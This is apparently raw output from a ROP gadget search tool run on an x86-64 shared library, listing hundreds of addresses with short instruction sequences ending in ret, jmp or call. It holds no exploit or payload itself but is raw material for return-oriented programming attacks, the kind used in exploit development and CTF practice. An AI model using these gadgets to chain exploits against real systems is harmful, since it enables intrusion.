0x00002aaaaac8e5a7 : add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaac730b7 : add al, bh ; ret
0x00002aaaaac86ec7 : add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7f1c7 : add al, bh ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaac86dd7 : add al, bl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac81127 : add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac81167 : add al, bl ; fpatan ; call qword ptr [rsi]
0x00002aaaaac811a7 : add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac851b7 : add al, bl ; jae 0x1b01b4 ; jmp qword ptr [rcx]
0x00002aaaaac78847 : add al, bl ; jns 0x1a383c ; jmp qword ptr [rcx]
0x00002aaaaac78f27 : add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaab8038a : add al, bl ; nop dword ptr [rax] ; add rax, 1 ; ret
0x00002aaaaab7ae7b : add al, bl ; nop dword ptr [rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac83147 : add al, bl ; out 0xf4, al ; jmp qword ptr [rbx]
0x00002aaaaac84df7 : add al, bl ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84977 : add al, bl ; pop rdx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac89af7 : add al, bl ; ret
0x00002aaaaac837a7 : add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac21b32 : add al, byte ptr [r8] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaabba119 : add al, byte ptr [r8] ; add byte ptr [rbx + 0xf4801e1], al ; ret
0x00002aaaaab5352c : add al, byte ptr [r8] ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaac6f70d : add al, byte ptr [r8] ; and al, 0x56 ; cli ; jmp rsp
0x00002aaaaac448e7 : add al, byte ptr [r8] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac6f855 : add al, byte ptr [r8] ; xor al, 0x66 ; cli ; call rsp
0x00002aaaaab5deb1 : add al, byte ptr [rax + rax*8 - 0xb7ed8c] ; ret 0x2288
0x00002aaaaac294f4 : add al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6f556 : add al, byte ptr [rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaac6f2a6 : add al, byte ptr [rax] ; add al, 0xd1 ; stc ; call rsp
0x00002aaaaab02e87 : add al, byte ptr [rax] ; add bl, dh ; ret
0x00002aaaaab5423d : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaabdb826 : add al, byte ptr [rax] ; add byte ptr [rax + 0x5f], bl ; call rax
0x00002aaaaab62d43 : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00002aaaaab49155 : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaac1241d : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab5c552 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; fisttp word ptr [rcx + rcx*4 - 6] ; call rax
0x00002aaaaab58731 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab529c0 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x18eb
0x00002aaaaababbbb : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8341
0x00002aaaaab62a39 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xc031
0x00002aaaaabde3ae : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab69a8b : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xf748
0x00002aaaaac413ab : add al, byte ptr [rax] ; add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaabe296b : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call 0xffffffffc34a217f
0x00002aaaaab5a2a5 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaaaf5d31 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab104fd : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac19b6d : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c791 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaababba5 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb04
0x00002aaaaac19b91 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab1f0b1 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaac156e0 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaaadb3ca : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac071ff : add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0x10 ; jmp rcx
0x00002aaaaac09c7f : add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0x58 ; jmp rcx
0x00002aaaaac093df : add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0x68 ; jmp rcx
0x00002aaaaac06662 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0xc8 ; jmp rcx
0x00002aaaaab3480d : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x5baf6
0x00002aaaaab3c494 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x63702
0x00002aaaaabd6c92 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp rax
0x00002aaaaaba1222 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac0c679 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaabc0742 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, qword ptr [rbp - 0x88] ; call rbx
0x00002aaaaabd7f12 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, r12 ; call rbx
0x00002aaaaabd7c85 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, r13 ; call rbx
0x00002aaaaabd7b51 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, r14 ; call rbx
0x00002aaaaabd7ac9 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, r15 ; call rbx
0x00002aaaaac0ed8c : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, rsp ; call rdx
0x00002aaaaabdda45 : add al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaab4a0ec : add al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab803d3 : add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaab9c52a : add al, byte ptr [rax] ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabe713b : add al, byte ptr [rax] ; add byte ptr [rbp + 0x2f], dh ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab3fcbc : add al, byte ptr [rax] ; add byte ptr [rbp + 0x480d75c0], al ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab83022 : add al, byte ptr [rax] ; add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xae042
0x00002aaaaab880fa : add al, byte ptr [rax] ; add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xb3122
0x00002aaaaab40d19 : add al, byte ptr [rax] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab46910 : add al, byte ptr [rax] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab0bde9 : add al, byte ptr [rax] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabba11a : add al, byte ptr [rax] ; add byte ptr [rbx + 0xf4801e1], al ; ret
0x00002aaaaaba1645 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x2f76ff06], al ; jle 0xcc663 ; ret
0x00002aaaaab8dee9 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x76b6f020], al ; ret
0x00002aaaaabbba23 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x76f72cac], cl ; push rsp ; ret
0x00002aaaaac46354 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x00002aaaaabac65e : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7cb7fe40], al ; ret 0x3d01
0x00002aaaaab1b076 : add al, byte ptr [rax] ; add byte ptr [rcx + 0x39], cl ; ret 0xea75
0x00002aaaaabe128e : add al, byte ptr [rax] ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaab3378e : add al, byte ptr [rax] ; add byte ptr [rcx - 0x73], cl ; dec dword ptr [r8 + 0x39] ; ret
0x00002aaaaabc7d13 : add al, byte ptr [rax] ; add byte ptr [rcx - 0x75], cl ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab56315 : add al, byte ptr [rax] ; add byte ptr [rcx - 0x77], cl ; ret 0x854d
0x00002aaaaab5352d : add al, byte ptr [rax] ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaab552a1 : add al, byte ptr [rax] ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaabf9ade : add al, byte ptr [rax] ; add byte ptr [rcx], bh ; ret
0x00002aaaaaaf9c24 : add al, byte ptr [rax] ; add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x1e76
0x00002aaaaaaf926c : add al, byte ptr [rax] ; add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x2876
0x00002aaaaac9076e : add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaaba0b3f : add al, byte ptr [rax] ; add byte ptr [rip - 0xfff], bh ; jae 0xcbb54 ; ret
0x00002aaaaabb512d : add al, byte ptr [rax] ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xddeb
0x00002aaaaac9340d : add al, byte ptr [rax] ; add byte ptr [rsp + rax], ah ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaac6f3de : add al, byte ptr [rax] ; add r15d, edx ; call rsp
0x00002aaaaab2a930 : add al, byte ptr [rax] ; add rsp, 0xd8 ; ret
0x00002aaaaac6f4f6 : add al, byte ptr [rax] ; and al, 0x22 ; cli ; call rsp
0x00002aaaaac6ef0e : add al, byte ptr [rax] ; and al, 0x52 ; stc ; call rsp
0x00002aaaaac6f70e : add al, byte ptr [rax] ; and al, 0x56 ; cli ; jmp rsp
0x00002aaaaac6fa5e : add al, byte ptr [rax] ; and al, 0xc3 ; cli ; jmp rsp
0x00002aaaaac90346 : add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac90466 : add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call rcx
0x00002aaaaac6f59e : add al, byte ptr [rax] ; hlt ; cli ; jmp rsp
0x00002aaaaac6ee3e : add al, byte ptr [rax] ; hlt ; cmp edi, ecx ; jmp rsp
0x00002aaaaac6f74e : add al, byte ptr [rax] ; hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaac6fb4e : add al, byte ptr [rax] ; in al, -0x2a ; cli ; call rsp
0x00002aaaaabea63b : add al, byte ptr [rax] ; je 0x115652 ; lea rax, qword ptr [rip - 0x767b6] ; ret
0x00002aaaaabea72b : add al, byte ptr [rax] ; je 0x115742 ; lea rax, qword ptr [rip - 0x76156] ; ret
0x00002aaaaabea7b5 : add al, byte ptr [rax] ; je 0x1157cb ; lea rax, qword ptr [rip - 0x6be60] ; ret
0x00002aaaaac6ef9e : add al, byte ptr [rax] ; je 0x19a00c ; stc ; call rsp
0x00002aaaaac6f476 : add al, byte ptr [rax] ; je 0x19a498 ; cli ; jmp rsp
0x00002aaaaac6f92e : add al, byte ptr [rax] ; je 0x19a8d7 ; cli ; call rsp
0x00002aaaaac6fa4e : add al, byte ptr [rax] ; je 0x19aa1e ; cli ; jmp qword ptr [rdi + rdx*2 + 2]
0x00002aaaaab63635 : add al, byte ptr [rax] ; je 0x8e64b ; lea rax, qword ptr [rip + 0x1b330] ; ret
0x00002aaaaab6379b : add al, byte ptr [rax] ; je 0x8e7b2 ; lea rax, qword ptr [rip + 0x10e4a] ; ret
0x00002aaaaab6885b : add al, byte ptr [rax] ; je 0x93872 ; lea rax, qword ptr [rip + 0xb63a] ; ret
0x00002aaaaabf81f2 : add al, byte ptr [rax] ; jne 0x123246 ; mov eax, r8d ; ret
0x00002aaaaab72ec5 : add al, byte ptr [rax] ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaac6f1d6 : add al, byte ptr [rax] ; mov dil, 0xf9 ; call rsp
0x00002aaaaac1b0f8 : add al, byte ptr [rax] ; mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaac1ca01 : add al, byte ptr [rax] ; mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaac1c9cd : add al, byte ptr [rax] ; mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaabf8448 : add al, byte ptr [rax] ; mov rax, rbx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab72e35 : add al, byte ptr [rax] ; mov rax, rdi ; ret
0x00002aaaaac3548f : add al, byte ptr [rax] ; movsxd r9, dword ptr [r10 + r9*4] ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac4285b : add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaabf14e9 : add al, byte ptr [rax] ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabda242 : add al, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaac6f6de : add al, byte ptr [rax] ; push rbx ; cli ; call rsp
0x00002aaaaac6fa66 : add al, byte ptr [rax] ; push rsp ; ret
0x00002aaaaac6f3c6 : add al, byte ptr [rax] ; push rsp ; sti ; stc ; jmp rsp
0x00002aaaaac90887 : add al, byte ptr [rax] ; ret
0x00002aaaaac908a7 : add al, byte ptr [rax] ; ret 0x503
0x00002aaaaac6fa56 : add al, byte ptr [rax] ; test al, dl ; cli ; jmp qword ptr [rdi + rdx*2 - 0x3cdbfffe]
0x00002aaaaac6f5fe : add al, byte ptr [rax] ; test byte ptr [rsi], bh ; cli ; jmp rsp
0x00002aaaaac6fade : add al, byte ptr [rax] ; test cl, cl ; cli ; jmp rsp
0x00002aaaaac6f266 : add al, byte ptr [rax] ; xchg eax, esp ; leave ; stc ; call rsp
0x00002aaaaac6ef36 : add al, byte ptr [rax] ; xchg eax, esp ; pop rax ; stc ; jmp rsp
0x00002aaaaac6f0ce : add al, byte ptr [rax] ; xchg ecx, r15d ; call rsp
0x00002aaaaac6f856 : add al, byte ptr [rax] ; xor al, 0x66 ; cli ; call rsp
0x00002aaaaab6e749 : add al, byte ptr [rbp + 0x38] ; ret
0x00002aaaaabde015 : add al, byte ptr [rbx + 0x574fff8] ; add eax, 1 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaab53806 : add al, byte ptr [rbx - 0x76b7fe38] ; pop r8 ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaab71f00 : add al, byte ptr [rbx - 0x78] ; add dword ptr cs:[rbx + rdi + 0xf], esi ; mov dh, 0x45 ; ret 0x8348
0x00002aaaaac6a140 : add al, byte ptr [rbx - 0x7d6d0004] ; cld ; jmp qword ptr [rdx]
0x00002aaaaac82b89 : add al, byte ptr [rcx + 0x283100e] ; push rsp ; ret
0x00002aaaaabe94ee : add al, byte ptr [rcx + 0x39] ; ret
0x00002aaaaac71510 : add al, byte ptr [rcx + 0xa] ; ret
0x00002aaaaab0ad6c : add al, byte ptr [rcx + 0xe1] ; adc byte ptr [rdi], cl ; ret 0x8b48
0x00002aaaaabc00ff : add al, byte ptr [rcx + 0xf] ; xchg eax, esp ; ret
0x00002aaaaab2f6d9 : add al, byte ptr [rcx - 0x77] ; ret 0x144
0x00002aaaaabb076d : add al, byte ptr [rcx - 0x7d] ; ret 0x4101
0x00002aaaaabe5ab5 : add al, byte ptr [rcx - 1] ; push rbp ; sub byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac6c59d : add al, byte ptr [rcx] ; add ah, dl ; mov ebp, edi ; jmp rsp
0x00002aaaaac801bd : add al, byte ptr [rcx] ; add byte ptr [rax - 0x1b], al ; call qword ptr [rsi]
0x00002aaaaabf7d18 : add al, byte ptr [rcx] ; add byte ptr [rax], al ; cmove eax, edx ; ret
0x00002aaaaabf7d37 : add al, byte ptr [rcx] ; add byte ptr [rax], al ; ret
0x00002aaaaac76410 : add al, byte ptr [rdi + 0xa] ; ret
0x00002aaaaabf834c : add al, byte ptr [rdx] ; cmp esi, edx ; ja 0x12333f ; mov eax, 0xffffffff ; ret
0x00002aaaaac7421e : add al, byte ptr [rdx] ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaac76c8d : add al, byte ptr [rdx] ; pop rsi ; ret
0x00002aaaaac76a65 : add al, byte ptr [rdx] ; push rsi ; ret
0x00002aaaaac7bb05 : add al, byte ptr [rdx] ; ret
0x00002aaaaac89fed : add al, byte ptr [rdx] ; xchg eax, ecx ; ret
0x00002aaaaab43575 : add al, byte ptr [rip + 0x5b000000] ; ret
0x00002aaaaac7c2b4 : add al, byte ptr [rsi + rcx + 0x38] ; ret
0x00002aaaaabb28bf : add al, byte ptr [rsi - 0x73] ; xor al, 0x2b ; call 0x938cb
0x00002aaaaab7ac7a : add al, byte ptr [rsi] ; add byte ptr [rax], al ; ret
0x00002aaaaac42dab : add al, byte ptr gs:[rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac6f555 : add al, byte ptr ss:[rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaabca3a5 : add al, ch ; adc eax, 0x48000000 ; add esp, 0x18 ; ret
0x00002aaaaac7f487 : add al, ch ; and esi, edx ; jmp qword ptr [rcx]
0x00002aaaaab4d0c2 : add al, ch ; clc ; ret
0x00002aaaaac8d9d7 : add al, ch ; fdivrp st(7) ; jmp rdi
0x00002aaaaabd47ec : add al, ch ; fidivr word ptr [rdi] ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x89 ; ret 0xfffe
0x00002aaaaabcec8f : add al, ch ; fisttp dword ptr [rsi] ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac7bb87 : add al, ch ; frndint ; call qword ptr [rax]
0x00002aaaaac1111e : add al, ch ; in al, dx ; xor al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac84bd7 : add al, ch ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac78a17 : add al, ch ; jg 0x1a3a0c ; call qword ptr [rcx]
0x00002aaaaabd3a6f : add al, ch ; jmp 0xfea7a
0x00002aaaaac85597 : add al, ch ; jp 0x1b0594 ; jmp qword ptr [rcx]
0x00002aaaaab4434a : add al, ch ; les eax, ptr [rip - 0x763f7b00] ; ret 0x8389
0x00002aaaaabecc60 : add al, ch ; mov edx, 0x48fff949 ; add esp, 0x28 ; ret
0x00002aaaaac485fd : add al, ch ; movsd dword ptr [rdi], dword ptr [rsi] ; ret 0xffea
0x00002aaaaab08542 : add al, ch ; pop rax ; ret
0x00002aaaaac05243 : add al, ch ; push rdi ; imul dh ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab31487 : add al, ch ; ret
0x00002aaaaab921f8 : add al, ch ; ret 0x572
0x00002aaaaab54ef8 : add al, ch ; ret 0x945
0x00002aaaaab44648 : add al, ch ; ret 0xa1
0x00002aaaaac00458 : add al, ch ; ret 0xcd
0x00002aaaaaaffca8 : add al, ch ; ret 0xea
0x00002aaaaac0d958 : add al, ch ; ret 0xef5c
0x00002aaaaabc7828 : add al, ch ; ret 0xf2cf
0x00002aaaaab81b78 : add al, ch ; ret 0xf810
0x00002aaaaab19b78 : add al, ch ; ret 0xfe90
0x00002aaaaabf86f8 : add al, ch ; ret 0xff0d
0x00002aaaaab4b76d : add al, ch ; std ; imul edi, ebp, 0x89c085ff ; ret
0x00002aaaaabc86ad : add al, ch ; std ; outsd dx, dword ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac84117 : add al, ch ; sub ch, dh ; jmp qword ptr [rbx]
0x00002aaaaac7c157 : add al, ch ; sub edx, edi ; jmp qword ptr [rdi]
0x00002aaaaabb6005 : add al, ch ; xor eax, 0x83fff4cc ; call qword ptr [rax]
0x00002aaaaac08237 : add al, ch ; xor eax, esi ; out dx, al ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac7aa77 : add al, cl ; jo 0x1a5a6d ; jmp qword ptr [rdx]
0x00002aaaaac81da7 : add al, cl ; nop ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8f827 : add al, cl ; xchg eax, esp ; sti ; jmp qword ptr [rdx]
0x00002aaaaabf81ef : add al, dh ; add r8b, byte ptr [r8] ; jne 0x123249 ; mov eax, r8d ; ret
0x00002aaaaac86def : add al, dh ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac811bf : add al, dh ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac77caf : add al, dh ; in eax, dx ; jmp rsi
0x00002aaaaac7aa5f : add al, dh ; insd dword ptr [rdi], dx ; out dx, al ; jmp rdx
0x00002aaaaac851cf : add al, dh ; jae 0x1b01cc ; jmp qword ptr [rcx]
0x00002aaaaab097b9 : add al, dh ; jg 0x3480f ; sub eax, edx ; shr rax, 0x3f ; ret
0x00002aaaaac755af : add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaaae1427 : add al, dh ; movsb byte ptr [rdi], byte ptr [rsi] ; adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac84e0f : add al, dh ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac837bf : add al, dh ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8213f : add al, dh ; xchg eax, ebp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81fff : add al, dh ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac5c38f : add al, dl ; cld ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaac825af : add al, dl ; cmpsd dword ptr [rsi], dword ptr [rdi] ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84bbf : add al, dl ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7ba1f : add al, dl ; jne 0x1a6a16 ; jmp qword ptr [rax]
0x00002aaaaac8557f : add al, dl ; jp 0x1b057c ; jmp qword ptr [rcx]
0x00002aaaaac7c07f : add al, dl ; jrcxz 0x1a7076 ; call rsp
0x00002aaaaac78daf : add al, dl ; mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaac7965f : add al, dl ; ret 0xffed
0x00002aaaaac69899 : add bh, ah ; call rax
0x00002aaaaac697d5 : add bh, ah ; jmp rax
0x00002aaaaac698f9 : add bh, ah ; push rax ; add edi, esp ; jmp rax
0x00002aaaaabff3c2 : add bh, al ; adc al, 0x10 ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaaaf68ff : add bh, al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab5856f : add bh, al ; add eax, 0x34224e ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaabc1fed : add bh, al ; or byte ptr [rsi], cl ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaac4954f : add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaac152d9 : add bh, bh ; and eax, 0x281660 ; ret
0x00002aaaaab71e26 : add bh, bh ; dec dword ptr [rdi] ; test byte ptr [rdi - 0x8fffff5], bh ; ret 0
0x00002aaaaab71945 : add bh, bh ; dec dword ptr [rdi] ; test byte ptr [rsi - 0x8fffff6], cl ; ret 0
0x00002aaaaac909e4 : add bh, bh ; inc dword ptr [rcx] ; or ch, byte ptr [rdi + 5] ; ret
0x00002aaaaac9087e : add bh, bh ; inc dword ptr [rcx] ; or ebx, eax ; add dword ptr [rbx], eax ; cmc ; add al, byte ptr [rax] ; ret
0x00002aaaaac0666c : add bh, bh ; loope 0x131605 ; ret
0x00002aaaaab42e6f : add bh, bh ; loopne 0x6dee4 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab4f3da : add bh, bh ; nop ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaab8f63a : add bh, bh ; ret
0x00002aaaaab61c59 : add bh, bh ; rol byte ptr [rbp + 0x48be75c0], 1 ; add esp, 8 ; ret
0x00002aaaaab44615 : add bh, bl ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdx*2 + 0x48], 0x89 ; ret
0x00002aaaaac6921d : add bh, bl ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaabcacf2 : add bh, byte ptr [rax + 0x16] ; jbe 0xf5d09 ; ret
0x00002aaaaab1f080 : add bh, byte ptr [rax + 1] ; ret
0x00002aaaaabcaf29 : add bh, byte ptr [rax - 1] ; add rsp, 0x18 ; ret
0x00002aaaaab4d962 : add bh, byte ptr [rax - 1] ; pop rbx ; ret
0x00002aaaaab0a45b : add bh, byte ptr [rax - 1] ; ret
0x00002aaaaac76f0c : add bh, byte ptr [rbp + 0x41380e0a] ; ret
0x00002aaaaac46722 : add bh, byte ptr [rcx] ; enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x00002aaaaabde2af : add bh, byte ptr [rcx] ; ret
0x00002aaaaabf834d : add bh, byte ptr [rcx] ; salc ; ja 0x12333e ; mov eax, 0xffffffff ; ret
0x00002aaaaac80e00 : add bh, byte ptr [rsi + 0xa] ; ret
0x00002aaaaac5c2e0 : add bh, ch ; int1 ; call qword ptr [rax]
0x00002aaaaac79181 : add bh, ch ; jmp rsp
0x00002aaaaac91497 : add bh, cl ; add al, 0 ; add byte ptr [rbx + 1], al ; add byte ptr [rax], al ; ret
0x00002aaaaaba8c45 : add bh, dh ; dec byte ptr [rbx - 0x7c97dba4] ; ret 0x8d01
0x00002aaaaabe9d7d : add bh, dh ; fiadd dword ptr [rcx - 0xfff05] ; dec dword ptr [rdi] ; ret 0x8348
0x00002aaaaabbedb6 : add bh, dh ; fisub dword ptr [rcx + rcx*4 + 0x10] ; mov eax, 0xffffffff ; ret
0x00002aaaaab0a776 : add bh, dh ; fsub dword ptr [rcx + rcx*4 + 1] ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab0a456 : add bh, dh ; fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; ret
0x00002aaaaabab6bd : add bh, dh ; ret
0x00002aaaaab71941 : add bh, dh ; ret 0
0x00002aaaaab800e9 : add bl, al ; lea rax, qword ptr [rip + 0xc20ce] ; ret
0x00002aaaaab80ccd : add bl, al ; lea rax, qword ptr [rip + 0xc5a6a] ; ret
0x00002aaaaab6302d : add bl, al ; lea rax, qword ptr [rip + 0xe1f9a] ; ret
0x00002aaaaabf7d2e : add bl, al ; mov eax, 0x100 ; ret
0x00002aaaaabf7d34 : add bl, al ; mov eax, 0x102 ; ret
0x00002aaaaaba2e8c : add bl, al ; mov eax, 0xffffffff ; ret
0x00002aaaaab81ef1 : add bl, al ; mov eax, 2 ; ret
0x00002aaaaabad9dd : add bl, al ; mov eax, 3 ; ret
0x00002aaaaabad9d7 : add bl, al ; mov eax, 4 ; ret
0x00002aaaaab5bbf4 : add bl, al ; mov rsi, rbx ; mov rdi, rax ; call rcx
0x00002aaaaab4a8bc : add bl, al ; nop ; and ecx, 0xffffffcf ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaaba1e5c : add bl, al ; nop ; mov eax, 0xfffa ; ret
0x00002aaaaabd073d : add bl, al ; nop ; xor eax, eax ; ret
0x00002aaaaac06871 : add bl, al ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaaba1e53 : add bl, al ; nop dword ptr [rax] ; mov eax, 0x7e ; ret
0x00002aaaaab02f1b : add bl, al ; nop dword ptr [rax] ; mov eax, edi ; and eax, 0x7f ; ret
